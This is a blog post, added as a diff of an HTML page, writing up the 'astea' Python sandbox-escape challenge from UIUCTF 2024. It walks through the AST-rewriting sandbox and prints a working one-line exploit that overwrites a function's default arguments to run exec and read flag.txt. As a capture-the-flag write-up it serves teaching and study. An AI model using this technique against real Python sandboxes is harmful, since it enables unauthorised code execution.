@@ -1,0 +1,277 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="Liste - https://nothoudaifa.github.io/">
+    <title>astea chall writeup from uiuctf 2024 | nothoudaifa</title>
+    <meta name="description" content="I talk about computer stuff.">
+    <meta property="og:title" content="astea chall writeup from uiuctf 2024" />
+<meta property="og:description" content="Understanding the code: We are given this python file
+import ast def safe_import(): print(&#34;Why do you need imports to make tea?&#34;) def safe_call(): print(&#34;Why do you need function calls to make tea?&#34;) class CoolDownTea(ast.NodeTransformer): def visit_Call(self, node: ast.Call) -&gt; ast.AST: return ast.Call(func=ast.Name(id=&#39;safe_call&#39;, ctx=ast.Load()), args=[], keywords=[]) def visit_Import(self, node: ast.AST) -&gt; ast.AST: return ast.Expr(value=ast.Call(func=ast.Name(id=&#39;safe_import&#39;, ctx=ast.Load()), args=[], keywords=[])) def visit_ImportFrom(self, node: ast.ImportFrom) -&gt; ast.AST: return ast.Expr(value=ast.Call(func=ast.Name(id=&#39;safe_import&#39;, ctx=ast.Load()), args=[], keywords=[])) def visit_Assign(self, node: ast." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nothoudaifa.github.io/posts/uiuctf2024-astea/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-25T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-06-25T00:00:00+00:00" />
+
+
+    <meta itemprop="name" content="astea chall writeup from uiuctf 2024">
+<meta itemprop="description" content="Understanding the code: We are given this python file
+import ast def safe_import(): print(&#34;Why do you need imports to make tea?&#34;) def safe_call(): print(&#34;Why do you need function calls to make tea?&#34;) class CoolDownTea(ast.NodeTransformer): def visit_Call(self, node: ast.Call) -&gt; ast.AST: return ast.Call(func=ast.Name(id=&#39;safe_call&#39;, ctx=ast.Load()), args=[], keywords=[]) def visit_Import(self, node: ast.AST) -&gt; ast.AST: return ast.Expr(value=ast.Call(func=ast.Name(id=&#39;safe_import&#39;, ctx=ast.Load()), args=[], keywords=[])) def visit_ImportFrom(self, node: ast.ImportFrom) -&gt; ast.AST: return ast.Expr(value=ast.Call(func=ast.Name(id=&#39;safe_import&#39;, ctx=ast.Load()), args=[], keywords=[])) def visit_Assign(self, node: ast."><meta itemprop="datePublished" content="2024-06-25T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2024-06-25T00:00:00+00:00" />
+<meta itemprop="wordCount" content="893">
+<meta itemprop="keywords" content="ctf,misc," />
+    
+    <link rel="canonical" href="https://nothoudaifa.github.io/posts/uiuctf2024-astea/">
+    <link rel="icon" href="https://nothoudaifa.github.io//assets/favicon.ico">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link href="https://www.google-analytics.com" rel="preconnect" crossorigin>
+    <link rel="alternate" type="application/atom+xml" title="nothoudaifa" href="https://nothoudaifa.github.io//atom.xml" />
+    <link rel="alternate" type="application/json" title="nothoudaifa" href="https://nothoudaifa.github.io//feed.json" />
+    <link rel="shortcut icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Bricolage+Grotesque">
+    
+    
+    <style>*,:after,:before{box-sizing:border-box;padding:0}body{font:1rem/1.5 bricolage grotesque,-apple-system,BlinkMacSystemFont,segoe ui,Helvetica,Arial,sans-serif;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;padding:2rem;background:#fffdfa;color:#000}.skip-link{position:absolute;top:-40px;left:0;background:#eee;z-index:100}.skip-link:focus{top:0}header{line-height:2;padding-bottom:1.5rem}.link{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-decoration:none}.time{font-variant-numeric:tabular-nums;white-space:nowrap}blockquote{border-left:5px solid #eee;padding-left:1rem;margin:0}a,a:visited{color:inherit}a:hover,a.heading-link{text-decoration:none}pre{padding:.5rem;overflow:auto;overflow-x:scroll;overflow-wrap:normal}code,pre{font-family:San Francisco Mono,Monaco,consolas,lucida console,dejavu sans mono,bitstream vera sans mono,monospace;font-size:normal;font-size:small;background:#eee}code{margin:.1rem;border:none;overflow:visible;overflow-wrap:anywhere}ul{list-style-type:square}ul,ol{padding-left:1.2rem}.list{line-height:2;list-style-type:none;padding-left:0}.list li{padding-bottom:.1rem}.meta{color:#777}.content{max-width:70ch;margin:0 auto}header{line-height:2;display:flex;justify-content:space-between;padding-bottom:1rem}header a{text-decoration:none}header ul{list-style-type:none;padding:0}header li,header a{display:inline}h2.post{padding-top:.5rem}header ul a:first-child{padding-left:1rem}.nav{height:1px;background:#000;content:'';max-width:10%}.list li{display:flex;align-items:baseline}.list li time{flex:initial}.hr-list{margin-top:0;margin-bottom:0;margin-right:.5rem;margin-left:.5rem;height:1px;border:0;border-bottom:1px dotted #ccc;flex:1 0 1rem}.m,hr{border:0;margin:3rem 0}img{max-width:100%;height:auto}.post-date{margin:5% 0}.index-date{color:#9a9a9a}.animate-blink{animation:opacity 1s infinite;opacity:1}@keyframes opacity{0%{opacity:1}50%{opacity:.5}100%{opacity:0}}.tags{display:flex;justify-content:space-between}.tags ul{padding:0;margin:0}.tags li{display:inline}.avatar{height:120px;width:120px;position:relative;margin:-10px 0 0 15px;float:right;border-radius:50%}table{width:100%;border-collapse:collapse}th,td{border:1px solid #ddd;text-align:left;padding:8px}th{background-color:#f2f2f2} </style>
+  
+    
+  
+  
+  <script type="application/ld+json">
+  {
+      "@context": "http://schema.org",
+      "@type": "BlogPosting",
+      "articleSection": "posts",
+      "name": "astea chall writeup from uiuctf 2024",
+      "headline": "astea chall writeup from uiuctf 2024",
+      "alternativeHeadline": "",
+      "description": "Understanding the code: We are given this python file\nimport ast def safe_import(): print(\u0026#34;Why do you need imports to make tea?\u0026#34;) def safe_call(): print(\u0026#34;Why do you need function calls to make tea?\u0026#34;) class CoolDownTea(ast.NodeTransformer): def visit_Call(self, node: ast.Call) -\u0026gt; ast.AST: return ast.Call(func=ast.Name(id=\u0026#39;safe_call\u0026#39;, ctx=ast.Load()), args=[], keywords=[]) def visit_Import(self, node: ast.AST) -\u0026gt; ast.AST: return ast.Expr(value=ast.Call(func=ast.Name(id=\u0026#39;safe_import\u0026#39;, ctx=ast.Load()), args=[], keywords=[])) def visit_ImportFrom(self, node: ast.ImportFrom) -\u0026gt; ast.AST: return ast.Expr(value=ast.Call(func=ast.Name(id=\u0026#39;safe_import\u0026#39;, ctx=ast.Load()), args=[], keywords=[])) def visit_Assign(self, node: ast.",
+      "inLanguage": "en-us",
+      "isFamilyFriendly": "true",
+      "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https:\/\/nothoudaifa.github.io\/posts\/uiuctf2024-astea\/"
+      },
+      "author" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "creator" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "accountablePerson" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "copyrightHolder" : "nothoudaifa",
+      "copyrightYear" : "2024",
+      "dateCreated": "2024-06-25T00:00:00.00Z",
+      "datePublished": "2024-06-25T00:00:00.00Z",
+      "dateModified": "2024-06-25T00:00:00.00Z",
+      "publisher":{
+          "@type":"Organization",
+          "name": "nothoudaifa",
+          "url": "https://nothoudaifa.github.io/",
+          "logo": {
+              "@type": "ImageObject",
+              "url": "https:\/\/nothoudaifa.github.io\/assets\/favicon.ico",
+              "width":"32",
+              "height":"32"
+          }
+      },
+      "image": "https://nothoudaifa.github.io/assets/favicon.ico",
+      "url" : "https:\/\/nothoudaifa.github.io\/posts\/uiuctf2024-astea\/",
+      "wordCount" : "893",
+      "genre" : [ "ctf" , "misc" ],
+      "keywords" : [ "ctf" , "misc" ]
+  }
+  </script>
+  
+  
+  </head>
+
+<body>
+  <a class="skip-link" href="#main">Skip to main</a>
+  <main id="main">
+  <div class="content">
+    <header>
+<p style="padding: 0;margin: 0;">
+  <a href="https://nothoudaifa.github.io/">
+    <b>nothoudaifa</b>
+    <span class="text-stone-500 animate-blink">▮</span>
+  </a>
+</p>
+<ul style="padding: 0;margin: 0;">
+  
+  
+  <li class="">
+    <a href="/posts/"><span>Posts</span></a>
+    
+  <li class="">
+    <a href="/about/"><span>About</span></a>
+    
+  </li>
+</ul>
+</header>
+<hr class="hr-list" style="padding: 0;margin: 0;">
+    <section>
+      <h2 class="post">astea chall writeup from uiuctf 2024</h2>
+      <h2 id="understanding-the-code">Understanding the code:</h2>
+<p>We are given this python file</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> <span style="color:#111">ast</span>
+
+<span style="color:#00a8c8">def</span> <span style="color:#75af00">safe_import</span><span style="color:#111">():</span>
+  <span style="color:#111">print</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Why do you need imports to make tea?&#34;</span><span style="color:#111">)</span>
+
+<span style="color:#00a8c8">def</span> <span style="color:#75af00">safe_call</span><span style="color:#111">():</span>
+  <span style="color:#111">print</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Why do you need function calls to make tea?&#34;</span><span style="color:#111">)</span>
+
+<span style="color:#00a8c8">class</span> <span style="color:#75af00">CoolDownTea</span><span style="color:#111">(</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">NodeTransformer</span><span style="color:#111">):</span>
+  <span style="color:#00a8c8">def</span> <span style="color:#75af00">visit_Call</span><span style="color:#111">(</span><span style="color:#111">self</span><span style="color:#111">,</span> <span style="color:#111">node</span><span style="color:#111">:</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Call</span><span style="color:#111">)</span> <span style="color:#f92672">-&gt;</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">AST</span><span style="color:#111">:</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Call</span><span style="color:#111">(</span><span style="color:#111">func</span><span style="color:#f92672">=</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Name</span><span style="color:#111">(</span><span style="color:#111">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;safe_call&#39;</span><span style="color:#111">,</span> <span style="color:#111">ctx</span><span style="color:#f92672">=</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Load</span><span style="color:#111">()),</span> <span style="color:#111">args</span><span style="color:#f92672">=</span><span style="color:#111">[],</span> <span style="color:#111">keywords</span><span style="color:#f92672">=</span><span style="color:#111">[])</span>
+  
+  <span style="color:#00a8c8">def</span> <span style="color:#75af00">visit_Import</span><span style="color:#111">(</span><span style="color:#111">self</span><span style="color:#111">,</span> <span style="color:#111">node</span><span style="color:#111">:</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">AST</span><span style="color:#111">)</span> <span style="color:#f92672">-&gt;</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">AST</span><span style="color:#111">:</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Expr</span><span style="color:#111">(</span><span style="color:#111">value</span><span style="color:#f92672">=</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Call</span><span style="color:#111">(</span><span style="color:#111">func</span><span style="color:#f92672">=</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Name</span><span style="color:#111">(</span><span style="color:#111">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;safe_import&#39;</span><span style="color:#111">,</span> <span style="color:#111">ctx</span><span style="color:#f92672">=</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Load</span><span style="color:#111">()),</span> <span style="color:#111">args</span><span style="color:#f92672">=</span><span style="color:#111">[],</span> <span style="color:#111">keywords</span><span style="color:#f92672">=</span><span style="color:#111">[]))</span>
+  
+  <span style="color:#00a8c8">def</span> <span style="color:#75af00">visit_ImportFrom</span><span style="color:#111">(</span><span style="color:#111">self</span><span style="color:#111">,</span> <span style="color:#111">node</span><span style="color:#111">:</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">ImportFrom</span><span style="color:#111">)</span> <span style="color:#f92672">-&gt;</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">AST</span><span style="color:#111">:</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Expr</span><span style="color:#111">(</span><span style="color:#111">value</span><span style="color:#f92672">=</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Call</span><span style="color:#111">(</span><span style="color:#111">func</span><span style="color:#f92672">=</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Name</span><span style="color:#111">(</span><span style="color:#111">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;safe_import&#39;</span><span style="color:#111">,</span> <span style="color:#111">ctx</span><span style="color:#f92672">=</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Load</span><span style="color:#111">()),</span> <span style="color:#111">args</span><span style="color:#f92672">=</span><span style="color:#111">[],</span> <span style="color:#111">keywords</span><span style="color:#f92672">=</span><span style="color:#111">[]))</span>
+  
+  <span style="color:#00a8c8">def</span> <span style="color:#75af00">visit_Assign</span><span style="color:#111">(</span><span style="color:#111">self</span><span style="color:#111">,</span> <span style="color:#111">node</span><span style="color:#111">:</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Assign</span><span style="color:#111">)</span> <span style="color:#f92672">-&gt;</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">AST</span><span style="color:#111">:</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Assign</span><span style="color:#111">(</span><span style="color:#111">targets</span><span style="color:#f92672">=</span><span style="color:#111">node</span><span style="color:#f92672">.</span><span style="color:#111">targets</span><span style="color:#111">,</span> <span style="color:#111">value</span><span style="color:#f92672">=</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Constant</span><span style="color:#111">(</span><span style="color:#111">value</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#111">))</span>
+  
+  <span style="color:#00a8c8">def</span> <span style="color:#75af00">visit_BinOp</span><span style="color:#111">(</span><span style="color:#111">self</span><span style="color:#111">,</span> <span style="color:#111">node</span><span style="color:#111">:</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">BinOp</span><span style="color:#111">)</span> <span style="color:#f92672">-&gt;</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">AST</span><span style="color:#111">:</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">BinOp</span><span style="color:#111">(</span><span style="color:#111">left</span><span style="color:#f92672">=</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Constant</span><span style="color:#111">(</span><span style="color:#ae81ff">0</span><span style="color:#111">),</span> <span style="color:#111">op</span><span style="color:#f92672">=</span><span style="color:#111">node</span><span style="color:#f92672">.</span><span style="color:#111">op</span><span style="color:#111">,</span> <span style="color:#111">right</span><span style="color:#f92672">=</span><span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">Constant</span><span style="color:#111">(</span><span style="color:#ae81ff">0</span><span style="color:#111">))</span>
+  
+<span style="color:#111">code</span> <span style="color:#f92672">=</span> <span style="color:#111">input</span><span style="color:#111">(</span><span style="color:#d88200">&#39;Nothing is quite like a cup of tea in the morning: &#39;</span><span style="color:#111">)</span><span style="color:#f92672">.</span><span style="color:#111">splitlines</span><span style="color:#111">()[</span><span style="color:#ae81ff">0</span><span style="color:#111">]</span>
+
+<span style="color:#111">cup</span> <span style="color:#f92672">=</span> <span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">parse</span><span style="color:#111">(</span><span style="color:#111">code</span><span style="color:#111">)</span>
+<span style="color:#111">cup</span> <span style="color:#f92672">=</span> <span style="color:#111">CoolDownTea</span><span style="color:#111">()</span><span style="color:#f92672">.</span><span style="color:#111">visit</span><span style="color:#111">(</span><span style="color:#111">cup</span><span style="color:#111">)</span>
+<span style="color:#111">ast</span><span style="color:#f92672">.</span><span style="color:#111">fix_missing_locations</span><span style="color:#111">(</span><span style="color:#111">cup</span><span style="color:#111">)</span>
+
+<span style="color:#111">exec</span><span style="color:#111">(</span><span style="color:#111">compile</span><span style="color:#111">(</span><span style="color:#111">cup</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;exec&#39;</span><span style="color:#111">),</span> <span style="color:#111">{</span><span style="color:#d88200">&#39;__builtins__&#39;</span><span style="color:#111">:</span> <span style="color:#111">{}},</span> <span style="color:#111">{</span><span style="color:#d88200">&#39;safe_import&#39;</span><span style="color:#111">:</span> <span style="color:#111">safe_import</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;safe_call&#39;</span><span style="color:#111">:</span> <span style="color:#111">safe_call</span><span style="color:#111">})</span>
+</code></pre></div><blockquote>
+<p>i used chatgpt to understand most of this.</p>
+</blockquote>
+<p>this python file takes your code and parse’s it using the ast python module.</p>
+<blockquote>
+<p>check the <a href="https://docs.python.org/3/library/ast.html">docs</a> for the ast module.</p>
+</blockquote>
+<p>after parsing it, it runs it through CoolDownTea().visit function. the CoolDownTea class inherits from ast.NodeTransformer, what this does is go through the generated ast and change the nodes in it based on the defined functions in the CoolDownTea Class.</p>
+<p>the CoolDownTea class does 4 things:</p>
+<ul>
+<li>it turns any function call it sees into a call of the safe_call function.</li>
+<li>it turns any import syntax (import module, from module import a) into a call to safe_import function.</li>
+<li>it turns any assignment (specificaly ast.Assign nodes in the ast, this will be important later) into a zero assignment eg: a=2 will become a = 0.</li>
+<li>it turns any binary operation into the binary operation on two zeros so 1+1 would become 0+0.</li>
+</ul>
+<p>after that, it compiles and executes the code using exec it sets <strong>builtins</strong> to {} and sets two functions safe_call and safe_import.</p>
+<h2 id="exploration">Exploration:</h2>
+<p>Looking at this from afar it seems impossible to do anything since we don’t have any builtin function and even if we did we can’t call because it will be changed to safe_call call.</p>
+<blockquote>
+<p>or is it?</p>
+</blockquote>
+<p>in python, functions have their own <strong>builtins</strong> which basically includes all the builtin functions we know and love so we can use that.</p>
+<blockquote>
+<p>now what?
+we still can’t call any functions.</p>
+</blockquote>
+<p>remember that we are using python, if we can assign the safe_call function to a builtin function from it’s builtins we are technically calling that function by calling safe_call. something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#111">safe_call</span> <span style="color:#f92672">=</span> <span style="color:#111">safe_call</span><span style="color:#f92672">.</span><span style="color:#111">__builtins__</span><span style="color:#111">[</span><span style="color:#d88200">&#39;print&#39;</span><span style="color:#111">]</span>
+</code></pre></div><p>the problem in here that this assignment will become (because of the NodeTransformer):</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#111">safe_call</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</code></pre></div><blockquote>
+<p>is there another way to an assignment in python.</p>
+</blockquote>
+<p>it turns out there is.
+after taking a look at all the nodes in the ast module <a href="https://docs.python.org/3/library/ast.html">docs</a>, it turns out there are four types of assignments:</p>
+<ul>
+<li>ast.Assign: the normal assignment we know</li>
+<li>ast.AugAssign: augmented assignment eg: x+= 2, a |= 1.</li>
+<li>ast.AnnAssign: just the normal assignment with a type annontiation.</li>
+<li>ast.NamedExpr: this is the walrus operator (this assignment does have some constraints).</li>
+</ul>
+<p>and as it turns out, the CoolDownTea class only checks for normal assignments, which means we can use annontiated assignments to our heats content.</p>
+<blockquote>
+<p>Cool
+Now we can get the flag right?</p>
+</blockquote>
+<p>In this case we can directly edit license._Printer__filenames and make it point to flag.txt then call license functions.
+but obviously i didn’t do that (i didn&rsquo;t know about it then).</p>
+<p>what i thought after reaching this is that i can call any builtin function but with no arguments.
+so is there anything in the python builtins that can help me.</p>
+<blockquote>
+<p>None, or at least i have not found anything</p>
+</blockquote>
+<p>until i discovered something, when u define a function with default arguments:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00a8c8">def</span> <span style="color:#75af00">func</span><span style="color:#111">(</span><span style="color:#111">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;cool&#39;</span><span style="color:#111">,</span> <span style="color:#111">age</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span><span style="color:#111">):</span>
+	<span style="color:#00a8c8">pass</span>
+</code></pre></div><p>this is actually reflected in one of the function propreties, specifically <strong>defaults</strong> , it would look like this for func:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#111">func</span><span style="color:#f92672">.</span><span style="color:#111">__defaults__</span> <span style="color:#f92672">==</span> <span style="color:#111">(</span><span style="color:#d88200">&#39;cool&#39;</span><span style="color:#111">,</span> <span style="color:#ae81ff">2</span><span style="color:#111">)</span>
+</code></pre></div><blockquote>
+<p>cool
+now we just gotta edit exec’s <strong>defaults</strong> with our payload and we win.</p>
+</blockquote>
+<p>builtin functions in python does not have the <strong>defaults</strong> field.</p>
+<p>but that’s not a problem, if there is a function that is user made and it uses it’s arguments to call any builtin function we can use that, the builtin function does not matter since we can change it using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#111">func</span><span style="color:#f92672">.</span><span style="color:#111">__builtins__</span><span style="color:#111">[</span><span style="color:#d88200">&#39;ord&#39;</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">func</span><span style="color:#f92672">.</span><span style="color:#111">__builtins__</span><span style="color:#111">[</span><span style="color:#d88200">&#39;exec&#39;</span><span style="color:#111">]</span>
+</code></pre></div><blockquote>
+<p>safe_call and safe_import do not match
+we can also access the global scope using safe_call.<strong>globals</strong> but none of the functions satisfy the requirements.</p>
+</blockquote>
+<p>until i noticed the fact the the global scope also contains the imported ast module, and it turns out all the functions in it have the <strong>defaults</strong> attribute.
+so i checked the <a href="https://github.com/python/cpython/blob/main/Lib/ast.py">source code</a> for the ast module.</p>
+<blockquote>
+<p>so is there any function in there?</p>
+</blockquote>
+<p>Yes. after 2 mins of searching i found it.</p>
+<p>the “_Unparser.interleave” function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00a8c8">class</span> <span style="color:#75af00">_Unparser</span><span style="color:#111">:</span>
+		<span style="color:#00a8c8">def</span> <span style="color:#75af00">interleave</span><span style="color:#111">(</span><span style="color:#111">self</span><span style="color:#111">,</span> <span style="color:#111">inter</span><span style="color:#111">,</span> <span style="color:#111">f</span><span style="color:#111">,</span> <span style="color:#111">seq</span><span style="color:#111">):</span>
+		    <span style="color:#d88200">&#34;&#34;&#34;Call f on each item in seq, calling inter() in between.&#34;&#34;&#34;</span>
+		    <span style="color:#111">seq</span> <span style="color:#f92672">=</span> <span style="color:#111">iter</span><span style="color:#111">(</span><span style="color:#111">seq</span><span style="color:#111">)</span>
+		    <span style="color:#00a8c8">try</span><span style="color:#111">:</span>
+		        <span style="color:#111">f</span><span style="color:#111">(</span><span style="color:#111">next</span><span style="color:#111">(</span><span style="color:#111">seq</span><span style="color:#111">))</span>
+		    <span style="color:#00a8c8">except</span> <span style="color:#75af00">StopIteration</span><span style="color:#111">:</span>
+		        <span style="color:#00a8c8">pass</span>
+		    <span style="color:#00a8c8">else</span><span style="color:#111">:</span>
+		        <span style="color:#00a8c8">for</span> <span style="color:#111">x</span> <span style="color:#f92672">in</span> <span style="color:#111">seq</span><span style="color:#111">:</span>
+		            <span style="color:#111">inter</span><span style="color:#111">()</span>
+		            <span style="color:#111">f</span><span style="color:#111">(</span><span style="color:#111">x</span><span style="color:#111">)</span>
+</code></pre></div><p>as u can see from the description of the function it’s just perfect.</p>
+<h2 id="exploit-crafting">Exploit crafting:</h2>
+<ul>
+<li>
+<p>first, we gotta edit the <strong>defaults</strong> of the interleave function, what we care about is f (function to be called), and seq (args for that function).</p>
+<p>we set it to call exec on “print(open(’flag.txt’).read())”</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#111">safe_call</span><span style="color:#f92672">.</span><span style="color:#111">__globals__</span><span style="color:#111">[</span><span style="color:#d88200">&#39;ast&#39;</span><span style="color:#111">]</span><span style="color:#f92672">.</span><span style="color:#111">_Unparser</span><span style="color:#f92672">.</span><span style="color:#111">interleave</span><span style="color:#f92672">.</span><span style="color:#111">__defaults__</span><span style="color:#111">:</span> <span style="color:#111">safe_call</span><span style="color:#f92672">.</span><span style="color:#111">__builtins__</span><span style="color:#111">[</span><span style="color:#d88200">&#39;tuple&#39;</span><span style="color:#111">]</span> <span style="color:#f92672">=</span>  <span style="color:#111">(</span><span style="color:#00a8c8">None</span><span style="color:#111">,</span> <span style="color:#00a8c8">None</span><span style="color:#111">,</span> <span style="color:#111">safe_call</span><span style="color:#f92672">.</span><span style="color:#111">__builtins__</span><span style="color:#111">[</span><span style="color:#d88200">&#39;exec&#39;</span><span style="color:#111">],</span> <span style="color:#111">[</span><span style="color:#d88200">&#39;print(open(&#34;flag.txt&#34;).read())&#39;</span><span style="color:#111">])</span> <span style="color:#111">;</span>
+</code></pre></div><ul>
+<li>second, we assign the safe_call function to interleave function.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#111">(</span><span style="color:#111">safe_call</span><span style="color:#f92672">:=</span> <span style="color:#111">safe_call</span><span style="color:#f92672">.</span><span style="color:#111">__globals__</span><span style="color:#111">[</span><span style="color:#d88200">&#39;ast&#39;</span><span style="color:#111">]</span><span style="color:#f92672">.</span><span style="color:#111">_Unparser</span><span style="color:#f92672">.</span><span style="color:#111">interleave</span><span style="color:#111">)</span>
+</code></pre></div><ul>
+<li>finally, we call the safe_call function</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#111">safe_call</span><span style="color:#111">()</span>
+</code></pre></div><p>our final exploit will be:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#111">safe_call</span><span style="color:#f92672">.</span><span style="color:#111">__globals__</span><span style="color:#111">[</span><span style="color:#d88200">&#39;ast&#39;</span><span style="color:#111">]</span><span style="color:#f92672">.</span><span style="color:#111">_Unparser</span><span style="color:#f92672">.</span><span style="color:#111">interleave</span><span style="color:#f92672">.</span><span style="color:#111">__defaults__</span><span style="color:#111">:</span> <span style="color:#111">safe_call</span><span style="color:#f92672">.</span><span style="color:#111">__builtins__</span><span style="color:#111">[</span><span style="color:#d88200">&#39;tuple&#39;</span><span style="color:#111">]</span> <span style="color:#f92672">=</span>  <span style="color:#111">(</span><span style="color:#00a8c8">None</span><span style="color:#111">,</span> <span style="color:#00a8c8">None</span><span style="color:#111">,</span> <span style="color:#111">safe_call</span><span style="color:#f92672">.</span><span style="color:#111">__builtins__</span><span style="color:#111">[</span><span style="color:#d88200">&#39;exec&#39;</span><span style="color:#111">],</span> <span style="color:#111">[</span><span style="color:#d88200">&#39;print(open(&#34;flag.txt&#34;).read())&#39;</span><span style="color:#111">])</span> <span style="color:#111">;</span> <span style="color:#111">(</span><span style="color:#111">safe_call</span><span style="color:#f92672">:=</span> <span style="color:#111">safe_call</span><span style="color:#f92672">.</span><span style="color:#111">__globals__</span><span style="color:#111">[</span><span style="color:#d88200">&#39;ast&#39;</span><span style="color:#111">]</span><span style="color:#f92672">.</span><span style="color:#111">_Unparser</span><span style="color:#f92672">.</span><span style="color:#111">interleave</span><span style="color:#111">)</span> <span style="color:#111">;</span> <span style="color:#111">safe_call</span><span style="color:#111">()</span>
+</code></pre></div><p>FLAG: uiuctf{maybe_we_shouldnt_sandbox_python_2691d6c1}</p>
+
+      
+      <div class="post-date">
+        <span class="g time">June 25, 2024 </span> &#8729;
+         
+         <a href="https://nothoudaifa.github.io/tags/ctf/">ctf</a> <a href="https://nothoudaifa.github.io/tags/misc/">misc</a>
+      </div>
+      
+    </section>
+    
+    
+    
+  </div>
+</main>
+</body>
+</html>
